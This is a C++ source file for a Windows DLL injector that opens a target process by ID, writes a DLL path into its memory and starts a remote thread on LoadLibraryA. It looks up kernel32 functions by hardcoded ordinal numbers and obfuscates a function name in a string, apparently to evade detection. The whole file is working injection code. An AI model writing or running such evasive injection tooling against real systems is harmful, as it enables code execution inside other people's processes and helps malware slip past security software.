// injector.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>


typedef HANDLE (*func_crt)(
    _In_ HANDLE hProcess,
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ SIZE_T dwStackSize,
    _In_ LPTHREAD_START_ROUTINE lpStartAddress,
    _In_opt_ LPVOID lpParameter,
    _In_ DWORD dwCreationFlags,
    _Out_opt_ LPDWORD lpThreadId
);

typedef HMODULE (*func_gmha)(
    _In_opt_ LPCSTR lpModuleName
);

typedef BOOL (*func_gmhex)(
    _In_ DWORD dwFlags,
    _In_opt_ LPCSTR lpModuleName,
    _Out_ HMODULE* phModule
);

typedef FARPROC(*func_gpa)(
    _In_ HMODULE hModule,
    _In_ LPCSTR lpProcName
);

typedef HANDLE (*func_opp) (
    _In_ DWORD dwDesiredAccess,
    _In_ BOOL bInheritHandle,
    _In_ DWORD dwProcessId
);

typedef HANDLE (__cdecl *func_op)(
    unsigned long,
    bool,
    unsigned long
);

typedef LPVOID (*func_va)(
    _In_opt_ LPVOID lpAddress,
    _In_     SIZE_T dwSize,
    _In_     DWORD flAllocationType,
    _In_     DWORD flProtect
);

typedef LPVOID (__cdecl *func_vaex)(
    _In_ HANDLE hProcess,
    _In_opt_ LPVOID lpAddress,
    _In_ SIZE_T dwSize,
    _In_ DWORD flAllocationType,
    _In_ DWORD flProtect
);

typedef BOOL (*func_wpm)(
    _In_ HANDLE hProcess,
    _In_ LPVOID lpBaseAddress,
    _In_reads_bytes_(nSize) LPCVOID lpBuffer,
    _In_ SIZE_T nSize,
    _Out_opt_ SIZE_T* lpNumberOfBytesWritten
);

typedef BOOL (*func_ch)(
    _In_ _Post_ptr_invalid_ HANDLE hObject
);

/*
This injector inject injected.dll at the C:/ path into a given process id as a first argument.
*/
int main(int argc, char** argv)
{
    // ordinals
    int ord_ll_A = 966;
    int ord_CRT = 236;
    int ord_OP = 1040;
    int ord_VA_Ex = 1484; 
    int ord_WPM = 1568;
    int ord_CH = 139;
    
    if (argc == 2) {

        std::string dll_path = "injected.dll"; // OurDLL path

        // LoadLibrary function
        HMODULE kernelM = GetModuleHandle("Kernel32.dll");
        LPVOID loadLibraryAdress = (LPVOID) GetProcAddress(kernelM, MAKEINTRESOURCE(ord_ll_A));

        if (loadLibraryAdress == NULL) {
            printf("failed to get 'L-o-a-d--L-i-b-r-a-r-y-A' function.");
        }
        
        // Get, Allocate and write DLL path.
        HANDLE handle = ((func_op) GetProcAddress(kernelM, MAKEINTRESOURCE(ord_OP)))(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
        LPVOID allocMem = ((func_vaex)GetProcAddress(kernelM, MAKEINTRESOURCE(ord_VA_Ex)))(handle, NULL, dll_path.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocate Memory section
        ((func_wpm)GetProcAddress(kernelM, MAKEINTRESOURCE(ord_WPM)))(handle, allocMem, dll_path.c_str(), dll_path.size(), NULL); // with DLL name to the targeted process

        // Inject .DLL file
        HANDLE threadID = ((func_crt)GetProcAddress(kernelM, MAKEINTRESOURCE(ord_CRT)))(handle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAdress, allocMem, NULL, NULL);
        if (threadID == NULL) {
            printf("failed.");
        }
        else {
            printf("succeeded.");
        }
        ((func_ch)GetProcAddress(kernelM, MAKEINTRESOURCE(ord_CH)))(handle); // close handle
    }
}
